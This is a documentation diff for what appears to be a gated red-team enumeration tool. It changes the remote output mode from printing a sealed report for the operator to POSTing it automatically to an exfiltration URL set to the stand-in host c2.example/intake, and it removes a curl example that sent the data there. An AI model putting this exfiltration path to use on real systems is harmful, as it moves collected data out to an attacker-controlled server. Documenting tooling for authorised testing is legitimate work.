@@ -784,10 +784,13 @@ STEALTHY_AUTHORIZED=1 "$BIN" \
   enum
 ```
 
-### 3.5 Remote output mode (operator-driven in v1)
+### 3.5 Remote output mode
 
-v1 does **not** silently POST. It prints the sealed body for the operator and
-writes the key only to a protected key path:
+Remote output seals the report, writes the key only to the protected key path,
+and POSTs the sealed body to an absolute HTTPS URL. A missing HTTPS client,
+connection failure, timeout, or non-success HTTP response fails the command.
+The request is bounded to a 10-second connection timeout and 30-second total
+timeout:
 
 ```bash
 export STEALTHY_EXFIL_URL='https://c2.example/intake'
@@ -796,14 +799,8 @@ STEALTHY_AUTHORIZED=1 "$BIN" --output remote \
   --key-output-path /approved/keys/remote.key enum
 ```
 
-Example operator follow-up (only on approved infra):
-
-```bash
-# After capturing SEALED_B64 from tool output; retain the protected key file separately:
-curl -fsS -X POST "https://c2.example/intake" \
-  -H 'Content-Type: text/plain' \
-  --data-binary "$SEALED_B64"
-```
+The encrypted body is sent through standard input and is not printed or placed
+in process arguments. Keep the protected key separately from the receiver.
 
 ### 3.6 Limited auto-exploit (ROE required)
 
